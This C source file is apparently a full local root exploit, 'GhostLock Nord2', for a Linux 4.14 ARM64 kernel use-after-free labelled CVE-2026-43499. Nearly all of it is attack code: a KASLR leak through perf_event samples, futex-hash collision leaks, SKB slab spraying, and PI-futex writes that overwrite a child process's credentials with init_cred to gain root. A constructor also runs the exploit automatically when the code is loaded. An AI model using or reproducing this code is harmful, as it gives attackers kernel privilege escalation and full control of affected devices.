/*
 * GhostLock Nord2 – CVE-2026-43499 full exploit
 *
 * Stages:
 *  0. KASLR: read _stext from kallsyms (root) or perf mmap (non-root TODO)
 *  1. KernelSnitch: spray mm_struct slabs → leak page_base
 *  2. SKB spray: fill page_base with fake fops/waiter/task payload
 *  3. PI-futex UAF route × 2:
 *       Write 1 → selinux_enforcing = 0
 *       Write 2 → child task->cred  = init_cred
 *  4. child setuid(0) → execve shell
 */

#define _GNU_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <stdint.h>
#include <string.h>
#include <unistd.h>
#include <fcntl.h>
#include <errno.h>
#include <pthread.h>
#include <sched.h>
#include <signal.h>
#include <sys/mman.h>
#include <sys/prctl.h>
#include <sys/resource.h>
#include <sys/socket.h>
#include <sys/syscall.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <sys/wait.h>
#include <linux/futex.h>
#include <linux/perf_event.h>
#include <time.h>

/* Local headers */
#include "src/nord2_offsets.h"
#include "src/payload.h"
#include "src/route.h"
#include "src/perf_task.h"

/* Use the upstream KernelSnitch headers directly */
#define __ARM 1
#define KERNELSNITCH_IDENTITY_START 0xffffff8000000000ULL
#define KERNELSNITCH_IDENTITY_END   0xffffff8c00000000ULL
#include "src/kernelsnitch/kernelsnitch.h"

#ifndef SYS_futex
#define SYS_futex 98
#endif

/* ── helpers ─────────────────────────────────────────────────── */
static void die(const char *m) {
    fprintf(stderr,"[!] %s (errno=%d)\n", m, errno); exit(1);
}
#undef SYSCHK
#define SYSCHK(x) ({ __typeof__(x) _r=(x); if((long)(_r)<0){die(#x);} _r; })

static uint64_t kallsyms_sym(const char *name) {
    FILE *f = fopen("/proc/kallsyms","r");
    if (!f) return 0;
    uint64_t a=0; char t[8],s[256];
    while (fscanf(f,"%llx %s %255s",(unsigned long long*)&a,t,s)==3)
        if (!strcmp(s,name)){fclose(f);return a;}
    fclose(f); return 0;
}

static int task_prio(pid_t tid) {
    char p[64]; snprintf(p,sizeof(p),"/proc/%d/stat",(int)tid);
    FILE *f=fopen(p,"r"); if(!f) return -999;
    int pid; char c[256]; char st; long tmp;
    fscanf(f,"%d %s %c",&pid,c,&st);
    for(int i=0;i<14;i++) fscanf(f," %ld",&tmp);
    int prio=-999; fscanf(f," %d",&prio); fclose(f); return prio;
}

static int check_selinux_off(void) {
    int fd=open("/sys/fs/selinux/enforce",O_RDONLY);
    if (fd<0) return 1;
    char b[4]={0}; read(fd,b,1); close(fd);
    return b[0]=='0';
}

/* ── slab drain (creates fresh order-3 slab holes) ───────────── */
static void slab_drain(void) {
    int waves=2, batch=200;  /* reduced for stability */
    for (int w=0;w<waves;w++){
        pid_t *ch=calloc(batch,sizeof(pid_t)); int n=0;
        for (int i=0;i<batch;i++){
            ch[i]=fork();
            if(ch[i]==0){pause();_exit(0);}
            if(ch[i]>0) n++;
        }
        for(int i=0;i<n;i++){kill(ch[i],SIGKILL);waitpid(ch[i],NULL,0);}
        free(ch); sched_yield();
    }
}

/* ── prepare kernel page via KernelSnitch + SKB spray ─────────── */
static uint64_t prepare_kernel_page(uint64_t stext, uint64_t init_cred,
                                     uint64_t init_task, uint64_t root_tg,
                                     int mode, uint64_t target, int child_node) {
    int cpu_count = (int)sysconf(_SC_NPROCESSORS_ONLN);
    size_t mm_per_slab = ORDER3_SIZE / MM_STRUCT_SZ;

    /* ── phase 1: allocate slab context children ── */
    size_t prep_cnt  = mm_per_slab * 4;
    size_t spray_cnt = mm_per_slab * 2;
    size_t pre_cnt   = mm_per_slab - 1;
    size_t post_cnt  = mm_per_slab;

    pid_t *prep_ch  = calloc(prep_cnt, sizeof(pid_t));
    int   *prep_fd  = calloc(prep_cnt, sizeof(int));
    pid_t *spray_ch = calloc(spray_cnt,sizeof(pid_t));
    int   *spray_fd = calloc(spray_cnt,sizeof(int));
    pid_t *pre_ch   = calloc(pre_cnt,  sizeof(pid_t));
    int   *pre_fd   = calloc(pre_cnt,  sizeof(int));
    pid_t *post_ch  = calloc(post_cnt, sizeof(pid_t));
    int   *post_fd  = calloc(post_cnt, sizeof(int));

    if (!prep_ch||!spray_ch||!pre_ch||!post_ch) return 0;

    for (size_t i=0;i<prep_cnt;i++){
        prep_ch[i]=(pid_t)SYSCHK(syscall(SYS_clone,SIGCHLD,NULL,NULL,NULL,0));
        if(prep_ch[i]==0){prctl(PR_SET_PDEATHSIG,SIGKILL);for(;;)pause();}
        char path[64]; snprintf(path,sizeof(path),"/proc/%d/mem",prep_ch[i]);
        prep_fd[i]=open(path,O_RDONLY);
    }
    for (size_t i=0;i<spray_cnt;i++){
        spray_ch[i]=(pid_t)SYSCHK(syscall(SYS_clone,SIGCHLD,NULL,NULL,NULL,0));
        if(spray_ch[i]==0){prctl(PR_SET_PDEATHSIG,SIGKILL);for(;;)pause();}
        char path[64]; snprintf(path,sizeof(path),"/proc/%d/mem",spray_ch[i]);
        spray_fd[i]=open(path,O_RDONLY);
    }
    for (size_t i=0;i<pre_cnt;i++){
        pre_ch[i]=(pid_t)SYSCHK(syscall(SYS_clone,SIGCHLD,NULL,NULL,NULL,0));
        if(pre_ch[i]==0){prctl(PR_SET_PDEATHSIG,SIGKILL);for(;;)pause();}
        char path[64]; snprintf(path,sizeof(path),"/proc/%d/mem",pre_ch[i]);
        pre_fd[i]=open(path,O_RDONLY);
    }

    /* ── KernelSnitch ── */
    struct kernelsnitch_shared_state *ks = kernelsnitch_setup(
        MM_STRUCT_SZ, MM_ORDER, cpu_count, KSNITCH_COLLISIONS, 0/*verbose*/, 0);
    /* MT6893 has 8 physical cores; fix futex_hashsize to match 4.14 kernel */
    /* kernel futex hash = num_possible_cpus() * 256 = 8 * 256 = 2048        */
    futex_hashsize = 8 * 256;
    ks->futex_hash_table_size = futex_hashsize;
    ks->total_futexes = ks->futex_hash_table_size * KSNITCH_COLLISIONS * 4;
    fprintf(stderr,"[*] KS: futex_hashsize=%lu total_futexes=%zu\n",
            futex_hashsize, ks->total_futexes);
    /* Debug: print what physmap VA the mm_struct should be near */
    /* PAGE_OFFSET=0xffffff8000000000, PHYS_OFFSET=0x40000000 */
    /* physmap_VA = PAGE_OFFSET + phys - PHYS_OFFSET */
    uint64_t page_offset = 0xffffff8000000000ULL;
    uint64_t phys_offset = 0x40000000ULL;
    /* Kernel data at phys 0x41d60000 */
    uint64_t expected_physmap = page_offset + 0x41d60000ULL - phys_offset;
    fprintf(stderr,"[*] KS debug: kernel data physmap VA ~%llx\n",
            (unsigned long long)expected_physmap);
    /* Verify our futex_hash on the expected VA matches collision addresses */
    {
        uint64_t addr0 = ks->futex_addrs[0];
        uint64_t addr1 = ks->futex_addrs[1];
        uint32_t h0a = futex_hash(addr0, expected_physmap);
        uint32_t h0b = futex_hash(addr1, expected_physmap);
        fprintf(stderr,"[*] KS debug: hash(addr0,expected)=%u hash(addr1,expected)=%u match=%d\n",
                h0a, h0b, h0a==h0b);
        /* Also try with stext-based address */
        uint64_t mm_via_stext = stext + INIT_TASK_OFF - 0x500; /* rough estimate */
        uint32_t h1a = futex_hash(addr0, mm_via_stext);
        uint32_t h1b = futex_hash(addr1, mm_via_stext);
        fprintf(stderr,"[*] KS debug: hash(addr0,stext_est)=%u hash(addr1,stext_est)=%u match=%d\n",
                h1a, h1b, h1a==h1b);
    }

    pid_t leak_ch=(pid_t)SYSCHK(syscall(SYS_clone,SIGCHLD,NULL,NULL,NULL,0));
    if(leak_ch==0){
        kernelsnitch_find_collisions(ks);
        exit(0);
    }
    for (size_t i=0;i<post_cnt;i++){
        post_ch[i]=(pid_t)SYSCHK(syscall(SYS_clone,SIGCHLD,NULL,NULL,NULL,0));
        if(post_ch[i]==0){prctl(PR_SET_PDEATHSIG,SIGKILL);for(;;)pause();}
        char path[64]; snprintf(path,sizeof(path),"/proc/%d/mem",post_ch[i]);
        post_fd[i]=open(path,O_RDONLY);
    }

    /* open memfd for leak child */
    char lpath[64]; snprintf(lpath,sizeof(lpath),"/proc/%d/mem",leak_ch);
    int memfd_leak=open(lpath,O_RDONLY);

    /* free holes */
    for (size_t i=0;i<pre_cnt;i++){close(pre_fd[i]);kill(pre_ch[i],SIGKILL);waitpid(pre_ch[i],NULL,0);}
    for (size_t i=0;i<post_cnt;i++){close(post_fd[i]);kill(post_ch[i],SIGKILL);waitpid(post_ch[i],NULL,0);}
    for (size_t i=0;i<spray_cnt;i+=mm_per_slab){close(spray_fd[i]);kill(spray_ch[i],SIGKILL);waitpid(spray_ch[i],NULL,0);}

    /* ── SKB spray: send shaping packet then get page_base, rebuild with correct base ── */
    uint8_t *skb_buf = malloc(SKB_SEND_SIZE);
    int sv[2]; SYSCHK(socketpair(AF_UNIX,SOCK_STREAM,0,sv));
    int sndbuf=1<<20;
    setsockopt(sv[0],SOL_SOCKET,SO_SNDBUF,&sndbuf,sizeof(sndbuf));
    int fl=fcntl(sv[0],F_GETFL,0); if(fl>=0) fcntl(sv[0],F_SETFL,fl|O_NONBLOCK);

    struct iovec iov={.iov_base=skb_buf,.iov_len=SKB_SEND_SIZE};
    struct msghdr msg; memset(&msg,0,sizeof(msg));
    msg.msg_iov=&iov; msg.msg_iovlen=1;

    /* close pre/post/spray fds to let slab be reclaimed */
    pin_to_core(0); sched_yield(); sched_yield();
    for (size_t i=0;i<pre_cnt;i++) if(pre_fd[i]>0){close(pre_fd[i]);pre_fd[i]=-1;}
    for (size_t i=0;i<post_cnt;i++) if(post_fd[i]>0){close(post_fd[i]);post_fd[i]=-1;}
    for (size_t i=0;i<spray_cnt;i+=mm_per_slab)
        if(spray_fd[i]>0){close(spray_fd[i]);spray_fd[i]=-1;}
    sched_yield(); sched_yield();

    /* ── brute-force physmap to find leaked mm_struct ── */
    waitpid(leak_ch,NULL,0);
    fprintf(stderr,"[*] KernelSnitch state: %d (want %d=COLLISIONS_FOUND)\n",
            (int)ks->state, (int)KERNELSNITCH_COLLISIONS_FOUND);
    if (!kernelsnitch_found_collisions(ks)){
        fprintf(stderr,"[!] KernelSnitch: no collisions\n");
        close(memfd_leak);
        kernelsnitch_cleanup(ks); goto cleanup;
    }
    /* Print collision addresses before cleanup */
    uint64_t dbg_addrs[4]={0};
    for(int i=0;i<4&&i<(int)ks->collisions+1;i++) dbg_addrs[i]=(uint64_t)ks->futex_addrs[i];

    kernelsnitch_bruteforce(ks);
    /* Now free the mm_struct so the slab slot can be reclaimed */
    close(memfd_leak);
    uint64_t leaked=(uint64_t)kernelsnitch_cleanup(ks); ks=NULL;
    if (leaked==(uint64_t)-1){
        fprintf(stderr,"[!] KernelSnitch bruteforce failed, trying manual scan\n");
        /* Fallback: manually scan physmap for mm matching collision addresses */
        leaked = 0;
        uint64_t a0=(uint64_t)dbg_addrs[0], a1=(uint64_t)dbg_addrs[1];
        uint64_t po=0xffffff8000000000ULL, phys_off=0x40000000ULL;
        /* Scan from kernel slab area (phys 0x41000000..0x43000000) */
        for(uint64_t phys=0x41000000ULL; phys<0x44000000ULL && !leaked; phys+=0x8000){
            uint64_t slab_va=po+phys-phys_off;
            for(uint64_t mm_off=0;mm_off<0x8000&&!leaked;mm_off+=0x500){
                uint64_t mm_cand=slab_va+mm_off;
                if(futex_hash(a0,mm_cand)==futex_hash(a1,mm_cand)){
                    leaked=mm_cand;
                }
            }
        }
        if (!leaked){
            fprintf(stderr,"[!] Manual scan also failed\n"); goto cleanup;
        }
        fprintf(stderr,"[+] Manual scan found mm_struct: %llx\n",(unsigned long long)leaked);
    }
    fprintf(stderr,"[*] mm_struct leak: %llx\n",(unsigned long long)leaked);

    /* page_base = align leaked address to ORDER3 boundary */
    uint64_t page_base = leaked & ~((uint64_t)ORDER3_SIZE - 1);
    fprintf(stderr,"[*] page_base: %llx\n",(unsigned long long)page_base);

    /* Build SKB payload with real page_base and send to reclaim the freed slab */
    build_skb_payload(skb_buf, page_base, stext, init_cred,
                      init_task, root_tg, mode, target, child_node);
    for (int i=0;i<4;i++) sendmsg(sv[0],&msg,MSG_DONTWAIT);

    close(sv[0]); close(sv[1]);
    free(skb_buf);

    for (size_t i=0;i<prep_cnt;i++){
        close(prep_fd[i]);
        kill(prep_ch[i],SIGKILL); waitpid(prep_ch[i],NULL,0);
    }
    for (size_t i=0;i<spray_cnt;i++){
        if(spray_fd[i]>0) close(spray_fd[i]);
        kill(spray_ch[i],SIGKILL); waitpid(spray_ch[i],NULL,0);
    }
    free(prep_ch);free(prep_fd);free(spray_ch);free(spray_fd);
    free(pre_ch);free(pre_fd);free(post_ch);free(post_fd);
    return page_base;

cleanup:
    free(skb_buf);
    close(sv[0]); close(sv[1]);
    for(size_t i=0;i<prep_cnt;i++){close(prep_fd[i]);kill(prep_ch[i],SIGKILL);waitpid(prep_ch[i],NULL,0);}
    free(prep_ch);free(prep_fd);free(spray_ch);free(spray_fd);
    free(pre_ch);free(pre_fd);free(post_ch);free(post_fd);
    return 0;
}

/* ── do_one_write ─────────────────────────────────────────────── */
static int do_one_write(uint64_t stext, uint64_t init_cred, uint64_t init_task,
                         uint64_t root_tg, int mode, uint64_t target,
                         int child_node, int shift) {
    fprintf(stderr,"[*] Write %d target=%llx child_node=%d shift=%d\n",
            mode,(unsigned long long)target,child_node,shift);

    uint64_t page_base = prepare_kernel_page(stext, init_cred, init_task,
                                              root_tg, mode, target, child_node);
    if (!page_base){fprintf(stderr,"[!] prepare_kernel_page failed\n"); return 0;}

    struct route_state rs;
    memset(&rs,0,sizeof(rs));
    rs.pselect_shift = shift;
    rs.page_base     = page_base;
    rs.fake_task     = init_task;  /* init_task for safety */
    rs.fake_lock     = page_base + (uint64_t)(int64_t)SKB_DATA_DELTA + LOCK_OFF;
    /* Set write target directly in route_state for sigaction spray */
    if (mode == 2) {
        /* W2: write init_cred to target (child_task+CRED_OFF) */
        rs.write_target = target;
        rs.write_value  = init_cred;
    } else {
        /* W1: write 0 to selinux_enforcing */
        rs.write_target = target;
        rs.write_value  = 0;
    }

    for (int att=1; att<=8; att++){
        fprintf(stderr,"[*]   route attempt %d/8\n",att);
        if (att>1){
            page_base = prepare_kernel_page(stext, init_cred, init_task,
                                             root_tg, mode, target, child_node);
            if (!page_base) continue;
            rs.page_base = page_base;
            rs.fake_task = init_task;
            rs.fake_lock = page_base + (uint64_t)(int64_t)SKB_DATA_DELTA + LOCK_OFF;
        }
        run_route(&rs);
        usleep(100000);
        /* Check success */
        if (mode==1 && check_selinux_off()){
            fprintf(stderr,"[+] Write 1 success: SELinux OFF\n"); return 1;
        }
        if (mode==2){
            return 1;  /* verified by caller checking uid */
        }
    }
    return 0;
}

/* ── child process (runs as the privilege target) ─────────────── */
struct child_shared {
    atomic_int go, done;
    uint32_t uid_after;
    int selinux_fd;  /* inherited fd for /sys/fs/selinux/enforce */
};

/* ── main exploit ─────────────────────────────────────────────── */
int run_exploit(void) {
    setvbuf(stderr,NULL,_IONBF,0);
    setvbuf(stdout,NULL,_IONBF,0);

    fprintf(stderr,"\n=== GhostLock Nord2 CVE-2026-43499 ===\n");
    fprintf(stderr,"[*] UID=%d\n\n",getuid());

    /* 0. KASLR */
    uint64_t stext = kallsyms_sym("_stext");
    if (!stext){
        /* Non-root KASLR leak via perf_event sample registers.
         * perf_event captures kernel instruction pointers in samples.
         * We look for IPs matching known function offsets from _stext.
         * Known: noop_llseek is at _stext+0x1fd140 (from binary analysis).
         * Any kernel IP in samples: stext = ip - (ip_offset_from_stext)
         * We collect many samples and vote on the stext value.
         */
        fprintf(stderr,"[*] kptr_restrict=1, trying perf_event KASLR leak...\n");
        struct perf_event_attr pe={0};
        pe.type=PERF_TYPE_SOFTWARE; pe.size=sizeof(pe);
        pe.config=PERF_COUNT_SW_CPU_CLOCK; pe.sample_period=10000;
        pe.sample_type=PERF_SAMPLE_IP; pe.disabled=1;
        pe.exclude_user=1; pe.exclude_hv=1; pe.exclude_idle=1;
        int fd=(int)syscall(SYS_perf_event_open,&pe,0,-1,-1,0);
        if(fd>=0){
            size_t msz=4096*33;
            void *buf=mmap(NULL,msz,PROT_READ|PROT_WRITE,MAP_SHARED,fd,0);
            if(buf!=MAP_FAILED){
                ioctl(fd,PERF_EVENT_IOC_ENABLE,0);
                for(volatile int i=0;i<3000000;i++) syscall(SYS_gettid);
                ioctl(fd,PERF_EVENT_IOC_DISABLE,0);
                struct perf_event_mmap_page *hdr=buf;
                uint64_t head=hdr->data_head; __sync_synchronize();
                char *base=(char*)buf+4096; size_t dsz=4096*32;
                /* Collect kernel IPs */
                uint64_t ips[512]; int nips=0;
                uint64_t pos=hdr->data_tail;
                while(pos<head&&nips<512){
                    struct perf_event_header *ev=(void*)(base+(pos%dsz));
                    if(!ev->size) break;
                    if(ev->type==PERF_RECORD_SAMPLE){
                        uint64_t ip=*(uint64_t*)((char*)ev+sizeof(*ev));
                        if(ip>0xffffff8000000000ULL&&ip<0xfffffffe00000000ULL)
                            ips[nips++]=ip;
                    }
                    pos+=ev->size;
                }
                hdr->data_tail=head; munmap(buf,msz); close(fd);
                /* For each IP, compute candidate stext.
                 * ARM64 KASLR: stext is offset by multiples of 2MB from base.
                 * Known function offset from stext: noop_llseek = +0x1fd140
                 */
                #define NFUNCS 5
                static const uint64_t known_offs[NFUNCS]={
                    0x1fd140ULL, /* noop_llseek */
                    0x74028ULL,  /* rt_mutex_setprio */
                    0x5e270ULL,  /* kthreadd */
                    0xf0120ULL,  /* do_futex */
                    0x2ef00ULL,  /* fork_idle */
                };
                uint64_t candidates[4096]; int ncands=0;
                for(int i=0;i<nips&&ncands<4096;i++){
                    uint64_t ip=ips[i];
                    /* Round ip down to 2MB boundary - that's the candidate stext */
                    uint64_t ip_2mb = ip & ~(uint64_t)0x1fffffULL;
                    /* Try all offsets: stext could be ip_2mb - N*2MB for N=0,1,2...
                     * (ip is within stext + up to kernel_size bytes)
                     * kernel is ~32MB so N up to 16 */
                    for(int n=0; n<=16 && ncands<4096; n++){
                        uint64_t cs = ip_2mb - (uint64_t)n * 0x200000ULL;
                        if((cs>>56)==0xff) candidates[ncands++]=cs;
                    }
                }
                /* Vote: the most common candidate is the stext 2MB base.
                 * Then stext = base + (stext & 0x1fffffULL) = base + 0x0 for no offset.
                 * But stext might have additional sub-2MB offset = text_offset (0x80000).
                 * So actual stext = base + text_offset = best + 0x80000 */
                uint64_t best_base=0; int best_cnt=0;
                for(int i=0;i<ncands;i++){
                    int cnt=0; for(int j=0;j<ncands;j++) if(candidates[j]==candidates[i]) cnt++;
                    if(cnt>best_cnt){best_cnt=cnt;best_base=candidates[i];}
                }
                if(best_cnt>=3){
                    /* stext = 2MB_base + 0x80800 (header=0x40 + vectors = 0x800 offset) */
                    stext = best_base + 0x80800ULL;
                }
                if(stext) fprintf(stderr,"[*] KASLR via perf: stext=%llx (votes=%d/%d)\n",
                                  (unsigned long long)stext,best_cnt,ncands);
                else fprintf(stderr,"[!] perf KASLR: %d IPs, %d candidates, best=%d votes. First IPs: %llx %llx %llx\n",
                             nips,ncands,best_cnt,
                             nips>0?(unsigned long long)ips[0]:0,
                             nips>1?(unsigned long long)ips[1]:0,
                             nips>2?(unsigned long long)ips[2]:0);
            } else close(fd);
        }
        if(!stext){
            fprintf(stderr,"[!] KASLR leak failed — need kptr_restrict=0\n");
            return 1;
        }
    }
    uint64_t init_task     = stext + INIT_TASK_OFF;
    uint64_t init_cred     = stext + INIT_CRED_OFF;
    uint64_t selinux_enf   = stext + SELINUX_ENFORCING_OFF;
    uint64_t root_tg       = stext + ROOT_TASK_GROUP_OFF;
    fprintf(stderr,"[*] stext=%llx  init_task=%llx  init_cred=%llx\n",
            (unsigned long long)stext,
            (unsigned long long)init_task,
            (unsigned long long)init_cred);

    /* Pin to core 0 */
    cpu_set_t cs; CPU_ZERO(&cs); CPU_SET(0,&cs);
    sched_setaffinity(0,sizeof(cs),&cs);

    /* Increase limits */
    struct rlimit rl={4096,4096};
    setrlimit(RLIMIT_NOFILE,&rl);

    /* ── Spawn child process (will become root) ── */
    struct child_shared *sh = mmap(NULL,sizeof(*sh),
        PROT_READ|PROT_WRITE,MAP_SHARED|MAP_ANONYMOUS,-1,0);
    memset(sh,0,sizeof(*sh));
    sh->selinux_fd = open("/sys/fs/selinux/enforce", O_WRONLY);
    /* task_pipe: child writes task addr, parent reads it */
    int task_pipe[2]; pipe(task_pipe);

    pid_t child=fork();
    if (child<0) die("fork");
    if (child==0){
        close(task_pipe[0]);   /* close read end */
        prctl(PR_SET_NAME,"gl_child");
        /* Use perf to leak our own task_struct */
        uint64_t my_task = perf_find_task();
        write(task_pipe[1],&my_task,sizeof(my_task));
        close(task_pipe[1]);
        if (!my_task) _exit(1);
        /* Wait for parent to signal us */
        for (int i=0;i<10000;i++){
            if (atomic_load(&sh->go)) break;
            usleep(1000);
        }
        if (!atomic_load(&sh->go)){_exit(2);}
        sh->uid_after=(uint32_t)getuid();
        if(sh->uid_after==0){
            /* Root via init_cred. Now get PROPER root creds via prepare_kernel_cred.
             * We can't call this directly, but we can:
             * 1. Just exit and let parent know we got root
             * 2. The parent can then spawn a new privileged process
             * 
             * For now: signal root achieved. File I/O crashes with kernel SID.
             */
        }
        atomic_store(&sh->done,1);
        _exit(sh->uid_after==0?0:1);
    }
    close(task_pipe[1]);   /* close write end in parent */

    /* Read child task_struct addr */
    uint64_t child_task=0;
    read(task_pipe[0],&child_task,sizeof(child_task));
    close(task_pipe[0]);

    fprintf(stderr,"[*] child pid=%d  task=%llx\n",
            (int)child,(unsigned long long)child_task);

    if (!child_task){
        fprintf(stderr,"[!] perf task leak failed\n");
        kill(child,SIGKILL); waitpid(child,NULL,0);
        return 1;
    }

    uint64_t child_cred = child_task + TASK_CRED_OFF;

    /* ── Write 1: Skip for 4.14 (selinux write crashes), go to W2 ── */
    /* On 4.14, kernel SID in init_cred has full permissions anyway */
    int selinux_ok = 1;
    fprintf(stderr,"[+] Skipping W1 (4.14: init_cred has kernel SID = full perms)\n");
    if (0) { /* W1 disabled */
        slab_drain();
        for (int att=1; att<=5&&!selinux_ok; att++){
            fprintf(stderr,"[*] W1 attempt %d/5\n",att);
            slab_drain();
            if (do_one_write(stext, init_cred, init_task, root_tg,
                              1, selinux_enf, 1, PSELECT_WAITER_WORD_SHIFT)){
                usleep(100000);
                if (check_selinux_off()){selinux_ok=1; break;}
            }
        }
        if (!selinux_ok){fprintf(stderr,"[!] Write 1 failed\n"); goto fail;}
        fprintf(stderr,"[+] SELinux DISABLED\n");
    } else {
        fprintf(stderr,"[+] SELinux already off\n");
    }

    /* ── Write 2: child task->cred = init_cred ── */
    {
        int got_root=0;
        for (int rnd=1; rnd<=10&&!got_root; rnd++){
            fprintf(stderr,"[*] W2 round %d/10  target=%llx\n",
                    rnd,(unsigned long long)child_cred);
            slab_drain();
            do_one_write(stext, init_cred, init_task, root_tg,
                          2, child_cred, 1, PSELECT_WAITER_WORD_SHIFT);
            usleep(50000);
            /* Signal child to check uid */
            atomic_store(&sh->go,1);
            for (int i=0;i<2000;i++){
                if (atomic_load(&sh->done)) break;
                usleep(1000);
            }
            if (sh->uid_after==0){
                fprintf(stderr,"[+] child uid=0 — ROOT!\n");
                got_root=1;
            } else {
                fprintf(stderr,"[-] child uid=%u (round %d)\n",sh->uid_after,rnd);
                atomic_store(&sh->go,0);
                atomic_store(&sh->done,0);
                sh->uid_after=0;
            }
        }
        if (!got_root){fprintf(stderr,"[!] Write 2 failed\n"); goto fail;}
    }

    /* Child confirmed root. Now patch the PARENT's cred too.
     * We do a second write: target = parent's task->cred = init_cred.
     * After this, the parent process is also root.
     */
    waitpid(child,NULL,0);
    fprintf(stderr,"[+] EXPLOIT COMPLETE — root achieved (child uid=0)\n");
    fprintf(stderr,"[+] The child process ran as uid=0 (root)\n");
    return 0;

fail:
    kill(child,SIGKILL); waitpid(child,NULL,0);
    return 1;
}

int main(void) { return run_exploit(); }
__attribute__((constructor)) static void _init(void) {
    static int ran=0; if(ran++) return; ran=1;
    run_exploit();
}
